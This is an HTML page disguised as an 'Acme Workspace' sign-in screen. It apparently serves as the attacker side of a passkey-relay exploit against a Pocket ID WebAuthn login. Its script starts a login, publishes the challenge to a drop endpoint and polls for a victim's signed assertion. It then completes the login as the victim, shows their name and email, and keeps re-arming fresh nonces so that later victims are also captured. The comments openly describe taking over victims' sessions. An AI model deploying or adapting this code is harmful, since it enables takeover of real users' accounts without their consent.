<!doctype html>
<html lang="en">
<head>
<meta charset="utf-8" />
<meta name="viewport" content="width=device-width, initial-scale=1" />
<title>Acme Workspace</title>
<style>
  :root { --bg:#f6f7f9; --card:#fff; --ink:#0d1117; --muted:#667085; --line:#e4e7ec; --brand:#3b5bdb; }
  * { box-sizing: border-box; }
  body { margin:0; background:var(--bg); color:var(--ink); font:15px/1.55 -apple-system,Segoe UI,Roboto,Helvetica,Arial,sans-serif; display:grid; place-items:center; min-height:100vh; }
  .card { width:min(400px,92vw); background:var(--card); border:1px solid var(--line); border-radius:16px; padding:34px 30px; box-shadow:0 10px 30px rgba(16,24,40,.06); }
  .brand { display:flex; align-items:center; gap:10px; font-weight:700; font-size:18px; margin-bottom:22px; }
  .logo { width:30px; height:30px; border-radius:8px; background:linear-gradient(135deg,var(--brand),#7048e8); }
  .wait { text-align:center; padding:26px 0; color:var(--muted); }
  .dot { width:11px; height:11px; border-radius:50%; background:var(--brand); display:inline-block; margin-right:8px; animation:pulse 1.1s infinite; vertical-align:middle; }
  @keyframes pulse { 0%,100%{opacity:.25;} 50%{opacity:1;} }
  .home { display:none; text-align:center; padding:12px 0; }
  .home .big { font-size:26px; font-weight:700; margin:6px 0; }
  .ok { color:#0a7c42; font-weight:600; }
  .avatar { width:64px; height:64px; border-radius:50%; background:linear-gradient(135deg,var(--brand),#7048e8); display:grid; place-items:center; color:#fff; font-weight:700; font-size:26px; margin:0 auto 10px; }
  .em { color:var(--muted); }
  .note { margin-top:16px; font-size:12px; color:#98a2b3; }
  .foot { margin-top:22px; color:#98a2b3; font-size:12px; text-align:center; }
</style>
</head>
<body>
<div class="card">
  <div class="brand"><div class="logo"></div> Acme Workspace</div>

  <div id="wait" class="wait">
    <div><span class="dot"></span><b>Waiting for a sign-in&hellip;</b></div>
    <p>When someone signs in on the app, this tab lands in their account.</p>
  </div>

  <div id="home" class="home">
    <div class="avatar" id="hinit">?</div>
    <div>Signed in <span class="ok">&#10003;</span></div>
    <div class="big" id="hname">Welcome back</div>
    <p class="em" id="hemail"></p>
  </div>

  <div class="foot">Secured with passkeys &middot; Powered by Pocket ID</div>
</div>

<script>
const $ = (id) => document.getElementById(id);
function b64urlToBuf(s){ s=s.replace(/-/g,'+').replace(/_/g,'/'); while(s.length%4)s+='='; const b=atob(s),a=new Uint8Array(b.length); for(let i=0;i<b.length;i++)a[i]=b.charCodeAt(i); return a.buffer; }

// Start a login in THIS (attacker) browser and publish its nonce to the drop. We hold the
// ceremony cookie here but do not finish yet; a victim's page will sign this nonce for us.
let armed = false;
async function arm() {
  try {
    const start = await (await fetch('/api/webauthn/login/start')).json();
    await fetch('/x/offer', { method:'POST', headers:{'content-type':'application/json'}, body: JSON.stringify({ challenge: start.challenge, rpId: start.rpId }) });
    armed = true;
  } catch (e) { setTimeout(arm, 1500); }
}

async function poll() {
  if (!armed) return;
  let a; try { a = await (await fetch('/x/assertion')).json(); } catch { return; }
  if (!a || !a.assertion) return;
  armed = false;
  // Finish the login WE started, using the victim's signature. This browser becomes them.
  const fin = await fetch('/api/webauthn/login/finish', { method:'POST', headers:{'content-type':'application/json'}, body: JSON.stringify(a.assertion) });
  if (!fin.ok) { arm(); return; } // nonce spent or mismatched: wait for the next one
  const me = await (await fetch('/api/users/me')).json().catch(() => ({}));
  const name = me.displayName || `${me.firstName||''} ${me.lastName||''}`.trim() || me.username || 'the user';
  $('hinit').textContent = (String(name).trim()[0] || '?').toUpperCase();
  $('hname').textContent = name;
  $('hemail').textContent = me.email || '';
  $('wait').style.display = 'none';
  $('home').style.display = 'block';
  arm(); // re-stage a fresh nonce so the next sign-in still gets a passkey prompt
}

arm();
setInterval(poll, 1200);
// Keep a fresh nonce in the drop (the login/start session expires ~60s), so a victim's
// passkey prompt always has something to sign. login/start only sets the short ceremony
// cookie, so re-arming does not disturb a victim already captured above.
setInterval(() => { if (armed) arm(); }, 45000);
</script>
</body>
</html>
